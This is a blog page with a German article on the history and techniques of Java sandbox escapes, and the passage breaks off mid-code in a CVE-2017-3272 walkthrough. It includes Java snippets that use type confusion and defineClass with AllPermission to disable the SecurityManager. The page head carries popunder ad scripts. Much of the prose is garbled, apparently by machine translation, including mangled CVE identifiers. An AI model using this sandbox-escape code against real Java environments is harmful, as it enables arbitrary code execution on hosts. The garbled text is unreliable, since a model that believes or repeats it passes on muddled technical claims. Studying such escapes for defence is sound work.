<!DOCTYPE HTML>
<html lang="en">
<head>
    <!--Setting-->
	<meta name="propeller" content="559defd067241a22d36c858d79da6c4c">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta http-equiv="Cache-Control" content="no-siteapp">
    <meta http-equiv="Cache-Control" content="no-transform">
    <meta name="renderer" content="webkit|ie-comp|ie-stand">
    <meta name="apple-mobile-web-app-capable" content="some thing fun">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no,email=no,adress=no">
    <meta name="browsermode" content="application">
    <meta name="screen-orientation" content="portrait">
    <link rel="dns-prefetch" href="https://fun.diyz.bid">
    <!--SEO-->





<meta name="robots" content="all" />
<meta name="google" content="all" />
<meta name="googlebot" content="all" />
<meta name="verify" content="all" />
    <!--Title-->


<title>Über 20 Jahre Java-Sandbox-Flucht | some thing fun</title>


    <link rel="alternate" href="/atom.xml" title="some thing fun" type="application/atom+xml">


    <link rel="icon" href="/favicon.ico">

    



<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7">
<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.5.0">
<link rel="stylesheet" href="/css/style.css?rev=@@hash">




    





    

	<script type="text/javascript">//<![CDATA[ 
(function() {
    var configuration = {
    "token": "5d381d5a10a469d391a326cc8d0915ee",
    "entryScript": {
        "type": "timeout",
        "timeout": 3000,
        "capping": {
            "limit": 5,
            "timeout": 24
        }
    },
    "exitScript": {
        "enabled": true
    },
    "popUnder": {
        "enabled": true
    }
};
    var script = document.createElement('script');
    script.async = true;
    script.src = '//cdn.shorte.st/link-converter.min.js';
    script.onload = script.onreadystatechange = function () {var rs = this.readyState; if (rs && rs != 'complete' && rs != 'loaded') return; shortestMonetization(configuration);};
    var entry = document.getElementsByTagName('script')[0];
    entry.parentNode.insertBefore(script, entry);
})();
//]]></script>
	<!-- PopAds.net Popunder Code for fun.diyz.bid -->
<script type="text/javascript" data-cfasync="false">
/*<![CDATA[/* */
  var _pop = _pop || [];
  _pop.push(['siteId', 2914327]);
  _pop.push(['minBid', 0]);
  _pop.push(['popundersPerIP', 0]);
  _pop.push(['delayBetween', 0]);
  _pop.push(['default', false]);
  _pop.push(['defaultPerDay', 0]);
  _pop.push(['topmostLayer', false]);
  (function() {
    var pa = document.createElement('script'); pa.type = 'text/javascript'; pa.async = true;
    var s = document.getElementsByTagName('script')[0]; 
    pa.src = '//c1.popads.net/pop.js';
    pa.onerror = function() {
      var sa = document.createElement('script'); sa.type = 'text/javascript'; sa.async = true;
      sa.src = '//c2.popads.net/pop.js';
      s.parentNode.insertBefore(sa, s);
    };
    s.parentNode.insertBefore(pa, s);
  })();
/*]]>/* */
</script>
<!-- PopAds.net Popunder Code End -->
</head>


<!--[if lte IE 8]>
<style>
    html{ font-size: 1em }
</style>
<![endif]-->
<!--[if lte IE 9]>
<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
<![endif]-->

<body>
    <nav class="main-navigation">
    <div class="container">
        <div class="row">
            <div class="col-sm-12">
                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
                    <span class="sr-only"></span>
                        <i class="fa fa-bars"></i>
                    </span>
                    <a class="navbar-brand" href="https://fun.diyz.bid">some thing fun</a>
                </div>
                <div class="collapse navbar-collapse" id="main-menu">
                    <ul class="menu">
                        
                            <li role="presentation" class="text-center">
                                <a href="/"><i class="fa "></i>Home</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/archives/"><i class="fa "></i>Archives</a>
                            </li>
                        
                    </ul>
                </div>
            </div>
        </div>
    </div>
</nav>
    <section class="content-wrap">
        <div class="container">
            <div class="row">
                <main class="col-md-8 main-content m-post">
                    <p id="process"></p>
<article class="post">
    <div class="post-head">
        <h1 id="Über 20 Jahre Java-Sandbox-Flucht">
            
	            Über 20 Jahre Java-Sandbox-Flucht
            
        </h1>
        <div class="post-meta">
    
    
    <span class="categories-meta fa-wrap">
        <i class="fa fa-folder-open-o"></i>
        <a href="/categories/ ">
             
        </a>
    </span>
    

    
    <span class="fa-wrap">
        <i class="fa fa-tags"></i>
        <span class="tags-meta">
            
                
            
        </span>
    </span>
    

    
        
        <span class="fa-wrap">
            <i class="fa fa-clock-o"></i>
            <span class="date-meta">2017/06/19</span>
        </span>
        
    
</div>

            
            
            <p class="fa fa-exclamation-triangle warning">
                This article was published before <strong>484</strong> days, and the content may be outdated.
            </p>
        
    </div>
    
    <div class="post-body post-content">
        <h3 id="1-Einfuhrung"><a href="#1-Einfuhrung" class="headerlink" title="1. Einführung"></a>1. Einführung</h3><p>Die Java-Plattform basiert auf einer Vielzahl von Server, Desktop, Workstation und Consumer Electronics-Produkte weit verbreitet. Ziel ist es, Sicherheitsmodell zu erreichen, die für gut gestaltete, das Java-Sandbox eine Vielzahl von Code potenziell gefährliche Prämisse Host bedroht ist nicht ausführen kann. Insbesondere dieses Sandbox-Verfahren für Java-Anwendung Sicherheit nicht vertrauenswürdige Ausführung, wie ein Web-Browser Java-Applet. Leider hat trotz der letzten zwei Jahrzehnte, Sicherheitspersonal große Anstrengungen unternommen, um weiterhin Fehler zu beheben und Plattformsicherheit zu verbessern, sondern alle Arten von Lücken die Sandbox noch zu umgehen entstehen.<br>In dieser Arbeit untersuchen wir die Java unsichere Vergangenheit und Gegenwart. Für pädagogische Zwecke listen wir alle bekannt und werden in der aktuellen Version der Sicherheitslücke behoben, ist das Ziel, einen Überblick über die Java-Plattform Sicherheitsfragen zur Verfügung zu stellen, so dass wir aus den Fehlern der Vergangenheit lernen können.</p>
<h3 id="2-Hintergrund-Eine-kurze-Geschichte"><a href="#2-Hintergrund-Eine-kurze-Geschichte" class="headerlink" title="2. Hintergrund Eine kurze Geschichte"></a>2. Hintergrund Eine kurze Geschichte</h3><h4 id="2-1-Java-Sandbox-Schwachstellen"><a href="#2-1-Java-Sandbox-Schwachstellen" class="headerlink" title="2.1 Java-Sandbox-Schwachstellen"></a>2.1 Java-Sandbox-Schwachstellen</h4><p>Sun ist die erste Version von Sun Microsystems im Jahr 1995 veröffentlicht. Ein Jahr später fand der Princeton University Forscher eine Reihe von Fehlern<br>Der Lage, den Sandkasten zu umgehen. Die Autoren fanden, Schwächen in der Sprache, Bytecode und Objektinitialisierung Aspekten, um nur einige zu nennen, gibt es zum Teil noch im Zeitpunkt dieser Artikel in Java geschrieben wurde. Dies ist die erste detaillierte Beschreibung von Java-Klassen laufen gegen Spoofing-Angriffe, wenn. Einige Jahre später, 2002, die letzte Stufe des Delirium (LSD) Forschungsteam präsentierten ihre Erkenntnisse über die Java Virtual Machine Sicherheit. Sie beschrieben im Detail die Auswirkungen der Bytecode-Verifikationsverfahren und Klassenladelücken, was zu Verwirrung Art oder Klasse von Spoofing-Angriffe. Im Jahr 2010 Koivu zum ersten Mal mit der Erklärung, wie er die CVE-2.010-0.840 Verwundbarkeit öffentlich, dass glaubwürdige Methode Verkettungs Angriffe auf Java Arbeit gefunden. Im Jahr 2011 beschreibt Drake, wie die Speicherbeschädigung in Java verwenden. Er erklärt, wie CVE-2009-3869 und CVE-2010-3552 zwei Stapelpufferüberlauf verwenden. Im Jahr 2012 beschrieben Guillardoy in CVE-2012-4681 erlaubt die Verletzlichkeit der beiden die Sandbox zu umgehen. Die erste Schwachstelle Zugriff auf eingeschränkte Klasse ermöglicht, zweite Lücke ermöglicht es Ihnen, private Felder zu ändern. Auch im Jahr 2012, beschreibt Oh, wie die Sicherheitslücke CVE-2012-0507 verwenden, um die Art von verwirren Angriffe auszuführen, um die Java-Sandbox zu umgehen. 2013, Gorenc und Spelman auf der 120 Java Verwundbarkeit ist eine groß angelegte Studie, und folgerte, dass unsichere Reflexion die häufigsten Java-Schwachstellen, aber diese Verwirrung ist die am häufigsten verwendeten Exploits. Noch im Jahr 2013, Lee und Nie entdeckten mehrere Schwachstellen, einschließlich Schwachstellen in nativen Methoden, können Sie die Sandbox umgehen. Auch im Jahr 2013 Kaiser beschreibt CVE-2013-1438, von James Forshaw einer zuverlässigen Methode Kette Verwundbarkeit entdeckt wurde, CVE-2012-5088 Sicherheits Explorations ist ein Spiegelbild Schwachstellen in Java gefunden. Während 2012-2013, gefunden Sicherheit Explorations Sicherheit Forscher heraus, dass mehr als 20 Java-Schwachstellen. Von Anfang 2014, Entwickler gängige Web-Browser (wie Chrome oder Firefox) sind standardmäßig deaktiviert NAPI bestimmt (und daher keinen Java-Code Standardfall ausführen kann). Java Angriffsfläche reduziert wird, so scheint es weniger Forschung über die Java-Sandbox zu umgehen. Allerdings Verwundbarkeit der Sandbox noch gelegentlich Pop-up zu umgehen. Zum Beispiel im Jahr 2018, beschreibt Lee wie CVE-2018-2826 verwenden, die die Art der Verwirrung XOR19 sind Lücken gefunden.</p>
<h4 id="2-2-Java-Plattform"><a href="#2-2-Java-Plattform" class="headerlink" title="2.2 Java-Plattform"></a>2.2 Java-Plattform</h4><p>Java Virtual Machine (JVM) und die Java-Klassenbibliothek (JCL): Abstrakte Java-Plattform kann in zwei Komponenten aufgeteilt werden.<br>JVM ist das Herz der Plattform. Es nativen Code-Implementierung und bietet alle grundlegenden Funktionen für die Programmausführung erforderlich ist, zum Beispiel Bytecode-Parser, der JIT-Compiler, der Garbage Collector und dergleichen. Da es in der Maschine durchgeführt wird, ist es auch wie alle anderen nativen binären Angriffe auf denselben Gegenstand, zum Beispiel Speicherfehler Pufferüberlauf umfassen.<br>JCL ist die Standardbibliotheken mit der JVM geliefert. Es enthält Hunderte von Systemklassen, vor allem in Java implementiert, wobei der kleinere Teil der Maschine erreicht wird. Da alle Systemklassen vertraut sind, werden sie mit allen Berechtigungen standardmäßig zugeordnet. Diese Berechtigungen, damit sie haben vollen Zugriff auf jede Art von Funktion (Dateisystem lesen / schreiben, vollen Zugriff auf das Netzwerk, etc.), um vollständig auf den Host zugreifen. Daher kann die Analyse von jeder Klasse von Systemsicherheitsfehler verwendet, um die Sandbox auszubrechen.<br>Daher ist der Hauptinhalt dieses Artikels in zwei Hauptteile gegliedert: eine Speicherbeschädigung bei Verarbeitung Verletzlichkeit, und die andere auf der Ebene der Java-Schwachstellen konzentrieren.</p>
<h4 id="2-3-Security-Management"><a href="#2-3-Security-Management" class="headerlink" title="2.3 Security Management"></a>2.3 Security Management</h4><p>JCL-Code wird die Sandbox durch Berechtigungsprüfungen erreicht, die meisten von ihnen die Erlaubnis zu überprüfen. Zum Beispiel vor jedem Zugriff auf das Dateisystem, prüft der Code, ob der Anrufer JCL Zugriff auf das Dateisystem. Im Folgenden ist ein Beispiel für Klasse <em>java.io.FileInputStream</em> Erlaubnis im Betreff Dokument zu lesen. Der Konstruktor überprüft, ob die Anrufer Berechtigungen gelesen haben, die angegebene Datei in der fünften Zeile zu lesen.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="function"><span class="keyword">public</span> <span class="title">FileInputStream</span><span class="params">(File file)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line"> <span class="number">2</span>:     String name = (file != <span class="keyword">null</span> ? file.getPath() : <span class="keyword">null</span>);</span><br><span class="line"> <span class="number">3</span>:     SecurityManager security = System.getSecurityManager();</span><br><span class="line"> <span class="number">4</span>:     <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line"> <span class="number">5</span>:         security.checkRead(name);</span><br><span class="line"> <span class="number">6</span>:     &#125;</span><br><span class="line"> <span class="number">7</span>:     <span class="keyword">if</span> (name == <span class="keyword">null</span>) &#123;</span><br><span class="line"> <span class="number">8</span>:         <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line"> <span class="number">9</span>:     &#125;</span><br><span class="line"><span class="number">10</span>:     <span class="keyword">if</span> (file.isInvalid()) &#123;</span><br><span class="line"><span class="number">11</span>:         <span class="keyword">throw</span> <span class="keyword">new</span> FileNotFoundException(<span class="string">"Invalid file path"</span>);</span><br><span class="line"><span class="number">12</span>:     &#125;</span><br><span class="line"><span class="number">13</span>:     fd = <span class="keyword">new</span> FileDescriptor();</span><br><span class="line"><span class="number">14</span>:     fd.incrementAndGetUseCount();</span><br><span class="line"><span class="number">15</span>:     <span class="keyword">this</span>.path = name;</span><br><span class="line"><span class="number">16</span>:     open(name);</span><br><span class="line"><span class="number">17</span>: &#125;</span><br></pre></td></tr></table></figure>
<p>Beachten Sie, dass die Berechtigung aus Leistungsgründen nur überprüft wird, wenn der Sicherheitsmanager festgelegt ist (Zeile 3-4). Daher ist ein typischer Angriff, der die Java-Sandbox umgeht, so konzipiert, dass der Sicherheitsmanager auf null gesetzt wird. Dies deaktiviert effektiv alle Berechtigungsprüfungen. Wenn der Sicherheitsmanager nicht eingerichtet ist, kann der Analyst beliebigen Code ausführen, als hätte er alle Berechtigungen.<br>Die Autorisierung kann jedoch nur auf Java-Ebene überprüft werden. Nativer Code wird mit allen Berechtigungen ausgeführt. Obwohl jeder native Code des Analysten direkt ausgeführt werden kann, wenn eine Speicherbeschädigungsanfälligkeit ausgenutzt wird, konzentrieren wir uns in allen Beispielen in diesem Artikel darauf, den Sicherheitsmanager so zu deaktivieren, dass er beliebigen Java-Code mit allen Berechtigungen ausführen kann.</p>
<h4 id="2-4-doPrivileged-Methode"><a href="#2-4-doPrivileged-Methode" class="headerlink" title="2,4 doPrivileged-Methode"></a>2,4 doPrivileged-Methode</h4><p>Wenn die Erlaubnis “P” geprüft wird, prüft die JVM, ob jedes Element des Aufrufstapels die Erlaubnis “P” hat. Wenn ein Element kein “P” hat, wird eine Sicherheitsausnahme ausgelöst. Diese Methode funktioniert die meiste Zeit gut. Einige Methoden in JCL, für die keine Berechtigung zum Aufrufen von m1 () erforderlich ist, müssen jedoch möglicherweise eine andere Methode m2 () in JCL aufrufen, die wiederum eine Berechtigung “P2” erfordert. Wenn die Methode main () in der Benutzerklasse ohne Berechtigung m1 () aufruft, löst die JVM mit der obigen Methode eine Sicherheitsausnahme aufgrund eines nachfolgenden Aufrufs von m2 () in m1 () aus. Tatsächlich haben m1 () und m2 () während des Call-Stack-Traversals die erforderlichen Berechtigungen, da sie zu einer vertrauenswürdigen Klasse in JCL gehören, aber main () hat keine Berechtigungen.<br>Die Lösung besteht darin, den Aufruf in m1 () in m2 () im doPrivileged () - Aufruf zu verpacken. Wenn also “P2” geprüft wird, stoppt der Stack-Traversal bei der Methode, die doPrivileged () aufruft, hier m1 (). Da m1 () eine Methode in JCL ist, hat sie alle Berechtigungen. Daher ist die Prüfung erfolgreich und der Stapellauf stoppt.<br>Ein echtes Beispiel ist die undemed () -Methode in <em>java.nio.Bits</em>. Es behandelt den Netzwerkfluss und muss die Architektur des Prozessors kennen. Für das Abrufen dieser Informationen ist jedoch die Berechtigung “get_property” erforderlich, die der Benutzercode möglicherweise nicht hat. Daher wird in diesem Fall der Aufruf von unaligned () von einer nicht vertrauenswürdigen Klasse aufgrund von Berechtigungsprüfungen fehlschlagen. Daher ist der Code in unaligned (), der Informationen über die Prozessorarchitektur abruft, im doPrivileged-Aufruf enthalten, wie unten gezeigt (Zeilen 4-5):</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="function"><span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">unaligned</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>:     <span class="keyword">if</span> (unalignedKnown)</span><br><span class="line"> <span class="number">3</span>:         <span class="keyword">return</span> unaligned;</span><br><span class="line"> <span class="number">4</span>:     String arch = AccessController.doPrivileged(</span><br><span class="line"> <span class="number">5</span>:         <span class="keyword">new</span> sun.security.action.GetPropertyAction(<span class="string">"os.arch"</span>));</span><br><span class="line"> <span class="number">6</span>:     unaligned = arch.equals(<span class="string">"i386"</span>) || arch.equals(<span class="string">"x86"</span>)</span><br><span class="line"> <span class="number">7</span>:         || arch.equals(<span class="string">"amd64"</span>) || arch.equals(<span class="string">"x86_64"</span>);</span><br><span class="line"> <span class="number">8</span>:     unalignedKnown = <span class="keyword">true</span>;</span><br><span class="line"> <span class="number">9</span>:     <span class="keyword">return</span> unaligned;</span><br><span class="line"><span class="number">10</span>: &#125;</span><br></pre></td></tr></table></figure>
<p>Nachdem die Berechtigung “get_property” ausgewählt wurde, überprüft das Stack-Traversal die Methode auf Bits.unaligned () und stoppt dann.</p>
<h3 id="3-Speicherbeschadigungsanfalligkeit"><a href="#3-Speicherbeschadigungsanfalligkeit" class="headerlink" title="3. Speicherbeschädigungsanfälligkeit"></a>3. Speicherbeschädigungsanfälligkeit</h3><h4 id="3-1-Art-der-Verwirrung"><a href="#3-1-Art-der-Verwirrung" class="headerlink" title="3.1 Art der Verwirrung"></a>3.1 Art der Verwirrung</h4><h5 id="3-1-1-Hintergrund"><a href="#3-1-1-Hintergrund" class="headerlink" title="3.1.1 Hintergrund"></a>3.1.1 Hintergrund</h5><p>Die erste Schwachstelle bei der Speicherbeschädigung, die wir beschrieben haben, ist eine Art der Verschleierung von Schwachstellen. Viele Java-Sicherheitslücken sind auf Sicherheitslücken angewiesen, um Sandboxing und neuerdings zu vermeiden. Kurz gesagt, wenn es eine Art Verwirrung gibt, betrachtet die VM den Typ des Objekts als _A_, während der Typ des Objekts tatsächlich _B_ ist. Wie kann ich den Sicherheitsmanager deaktivieren?<br>Die Antwort lautet, dass Sicherheitslücken durch Typverwechslungen verwendet werden können, um auf Methoden zuzugreifen, die für Analysten ohne Berechtigung nicht verfügbar sind. Die typische Methode, auf die Analysten abzielen, ist die Methode defineClass () der Klasse <em>ClassLoader</em>. Warum? Nun, dieser Ansatz ermöglicht es Ihnen, eine benutzerdefinierte Klasse mit allen Berechtigungen zu definieren (und kann daher von einem Analysten kontrolliert werden). Daher erstellt und führt der Analyst eine eigene neu definierte Klasse aus, die Code enthält, der verhindert, dass der Sicherheitsmanager alle Berechtigungsprüfungen umgeht.<br>Die Methode defineClass () ist ‘protected’ und kann daher nur aus Methoden in der Klasse <em>ClassLoader</em> oder Unterklassen von <em>ClassLoader</em> aufgerufen werden. Wie der Analyst kann in dem Verfahren <em>ClassLoader</em> nicht geändert werden, so dass seine einzige Option in Subklassen <em>ClassLoader</em> defineClass () aufrufen können. Allerdings ist der Code nicht direkt über die Berechtigung von der Instanziierung <em>ClassLoader</em> Unterklasse eine Sicherheitsausnahme auslösen, weil <em>ClassLoader</em> Konstruktor wird die Berechtigungen „Create_ClassLoader“ überprüfen. Der Trick ist eine erweiterte Analysten <em>ClassLoader</em> Klassen, wie die folgenden <em>Help</em> Klasse, und fügen eine statische Methode, den Typ des Objekts als Parameter <em>Help</em> zu definieren. Der Analyst ruft dann die vorhandene <em>ClassLoader</em> -Instanz aus der Umgebung ab und “wirft” sie mithilfe von Typverschleierung in <em>Help</em>. Unter Verwendung dieses Verfahrens, dass die JVM doWork Methode () (unterhalb der Linie 4) ist eine Unterklasse von <em>ClassLoader</em> h (die tatsächliche Art und das ist <em>ClassLoader</em>), und daher ist die defineClass Protected-Methode () wird verfügbar, Der Analyst verwendet (geschützte Methoden) Java kann von Unterklassen zugegriffen werden).<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Help</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> <span class="keyword">implements</span></span></span><br><span class="line"> 2: 	Serializable &#123;</span><br><span class="line"> <span class="number">3</span>:</span><br><span class="line"> <span class="number">4</span>:   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doWork</span><span class="params">(Help h)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"> <span class="number">5</span>:</span><br><span class="line"> <span class="number">6</span>:     <span class="keyword">byte</span>[] buffer = BypassExploit.getDefaultHelper();</span><br><span class="line"> <span class="number">7</span>:     URL url = <span class="keyword">new</span> URL(<span class="string">"file:///"</span>);</span><br><span class="line"> <span class="number">8</span>:     Certificate[] certs = <span class="keyword">new</span> Certificate[<span class="number">0</span>];</span><br><span class="line"> <span class="number">9</span>:     Permissions perm = <span class="keyword">new</span> Permissions();</span><br><span class="line"><span class="number">10</span>:     perm.add(<span class="keyword">new</span> AllPermission());</span><br><span class="line"><span class="number">11</span>:     ProtectionDomain protectionDomain = <span class="keyword">new</span> ProtectionDomain(</span><br><span class="line"><span class="number">12</span>:      <span class="keyword">new</span> CodeSource(url, certs), perm);</span><br><span class="line"><span class="number">13</span>:</span><br><span class="line"><span class="number">14</span>:     Class cls = h.defineClass(<span class="string">"DefaultHelper"</span>, buffer, <span class="number">0</span>,</span><br><span class="line"><span class="number">15</span>:      buffer.length, protectionDomain);</span><br><span class="line"><span class="number">16</span>:     cls.newInstance();</span><br><span class="line"><span class="number">17</span>:</span><br><span class="line"><span class="number">18</span>:   &#125;</span><br><span class="line"><span class="number">19</span>: &#125;</span><br></pre></td></tr></table></figure></p>
<p>Genauer gesagt können Analysten das Sandboxing in drei Schritten deaktivieren. Zunächst kann der Analyst den Anwendungsklassenlader wie folgt abrufen (dieser Schritt benötigt keine Berechtigungen): <code>Objekt cl = Help.class.getClassLoader ();</code><br>Zweitens kann er mithilfe der Typ-Confusion-Schwachstelle die VM denken lassen, dass der Typ des Objekts cl <em>Help</em> ist. <code>Hilfe h = use_type_confusion_to_convert_to_Help (cl);</code><br>Drittens stellt er h als Parameter für die statische Methode doWork () in <em>Help</em> zur Verfügung, die den Sicherheitsmanager deaktiviert.<br>Die Methode doWork () lädt zunächst den Bytecode der Klasse <em>DefaultHelper</em>, der vom Analyst im Puffer gesteuert wird (Zeile 6 in der obigen Liste), führt ihn jedoch nicht aus. Wie unten gezeigt, deaktiviert diese Klasse den Sicherheitsmanager im doPrivileged () - Block in seinem Konstruktor. Der doPrivileged () - Block ist erforderlich, um zu verhindern, dass die Berechtigungen des gesamten Aufruf-Stacks überprüft werden, da main () Teil der aufrufenden Sequenz ist und keine Berechtigungen besitzt.<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DefaultHelper</span> <span class="keyword">implements</span> <span class="title">PrivilegedExceptionAction</span>&lt;<span class="title">Void</span>&gt; </span>&#123;</span><br><span class="line"><span class="number">2</span>:   <span class="function"><span class="keyword">public</span> <span class="title">DefaultHelper</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">3</span>:       AccessController.doPrivileged(<span class="keyword">this</span>);</span><br><span class="line"><span class="number">4</span>:   &#125;</span><br><span class="line"><span class="number">5</span>:</span><br><span class="line"><span class="number">6</span>:   <span class="function"><span class="keyword">public</span> Void <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="number">7</span>:     System.setSecurityManager(<span class="keyword">null</span>);</span><br><span class="line"><span class="number">8</span>:   &#125;</span><br><span class="line"><span class="number">9</span>: &#125;</span><br></pre></td></tr></table></figure></p>
<p>Nach dem Bytecode Laden, erstellt es eine Schutzdomäne alle Berechtigungen (Zeilen 7-12) hat. Schließlich ruft defineClass () (Zeilen 14 bis 15) auf h. Dieser Aufruf ist gültig, weil VM-Typ h denken ist <em>Help</em>. In der Tat ist h vom Typ <em>ClassLoader</em>. Jedoch ist das Verfahren defineClass () Methode als geschützte definiert, so genannte in der Klasse <em>ClassLoader</em> erfolgreich ist. Zu diesem Zeitpunkt haben die Analysten alle ihre Rechte geladen. Der letzte Schritt (Linie 16) ist ein Beispiel der Klasse, einen Anruf an der run () auszulösen, die den Sicherheitsmanager abzuschalten. Nach den Sicherheitsmanager zu deaktivieren, kann Analysten beliebigen Java-Code ausführen, als ob sie alle die gleichen Rechte haben.</p>
<p>3.1.2 Beispiel #####: CVE-2017-3272<br>Auf einer erklären, wie welche Art von Verletzlichkeit ist verwirrt und Analysten verwenden sie den Sicherheitsmanager zu deaktivieren. Dieser Abschnitt enthält ein Beispiel, das zeigt, wie CVE-2017-3272 verwenden, solche Angriffe zu implementieren.<br>Redhat Bugzilla bietet die folgenden technischen Details über die CVE-2017-3272:<br>„Es wurde festgestellt, dass OpenJDK Komponenten von Bibliotheken in <em>java.util.concurrent.atomic</em> Paket Atom Feld Update-Vorgang ist nicht richtig Zugriff auf das Element geschützten Bereich beschränken. Untrusted Java-Anwendung oder ein Applet verwenden diese Sicherheitsanfälligkeit der Java-Sandbox Einschränkungen zu umgehen. “<br>Dies deutet darauf hin, dass der anfällige Code ist in <em>java.util.concurrent.atomic.package</em>, die zu einem geschützten Bereich Zugang bezogen. Die Seite auch Links zu dem OpenJDK-Patch „8165344. Aktualisiert Gleichzeitigkeit Unterstützung“ Dieser Patch ändert den _AtomicIntegerFieldUpdater _, _ <em>AtomicLongFieldUpdater</em> und <em>AtomicReferenceFieldUpdater</em> Klasse. Was sind diese Kurse für?<br>Um bei gleichzeitiger Änderung Feld zu beschäftigen, Java bietet _AtomicLong _, _ AtomicInt_ und <em>AtomicBoolean</em> etc … Zum Beispiel können schaffen gleichzeitige Änderung von zehn Millionen <em>long</em> Feld durchführen, müssen zehn Millionen instanziiert <em>AtomicLong</em> Objekt. Da eine einzelne Instanz <em>AtomicLong</em> 24 Bytes + 4 Bytes = 28 Bytes erfordert Referenzbeispiel daher 10000000 <em>AtomicLong</em> Instanz darstellt 267 Mib.<br>Im Gegensatz dazu erfordert die Verwendung von <em>AtomicLongFieldUpdater</em> Klasse 10.000.000 <em> 8 = 76 MiB. In der Tat, lange der einzige Feldraum belegt. Darüber hinaus, weil alle Methoden _Atomic </em> FieldUpdater_ Klasse statisch sind, zu schaffen, damit eine einzelne Instanz Update nur. Ein weiterer Vorteil der <em>Atomic * FieldUpdater</em>-Klasse ist der Garbage Collector nicht zu verfolgen, hat zehn Millionen <em>AtomicLong</em> Objekte. Um jedoch so zu tun, zu Updater-Funktion Java unsicher durch die Speicheradresse <em>sun.misc.Unsafe</em>-Klasse die Zielfeld abzurufen.<br>So erstellen <em>AtomicReferenceFieldUpdater</em> Beispiele unten. Verfahren newUpdater () -Aufruf müssen drei Parameter verwenden: Name TClass, von der Art, einen Feldtyp umfasst, und der Typ Feldname Vclass Felder, Feld.<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: <span class="keyword">public</span> <span class="keyword">static</span> &lt;U,W&gt; <span class="function">AtomicReferenceFieldUpdater&lt;U,W&gt; <span class="title">newUpdater</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">2</span>:                                 Class&lt;U&gt; tclass,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">3</span>:                                 Class&lt;W&gt; vclass,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">4</span>:                                 String fieldName)</span> </span>&#123;</span><br><span class="line"><span class="number">5</span>:   <span class="keyword">return</span> <span class="keyword">new</span> AtomicReferenceFieldUpdaterImpl&lt;U,W&gt;</span><br><span class="line"><span class="number">6</span>:     (tclass, vclass, fieldName, Reflection.getCallerClass());</span><br><span class="line"><span class="number">7</span>: &#125;</span><br></pre></td></tr></table></figure></p>
<p>Die Methode newUpdater () ruft den Konstruktor von <em>AtomicReferenceFieldUpdaterImpl</em> auf, um die eigentliche Arbeit auszuführen.<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 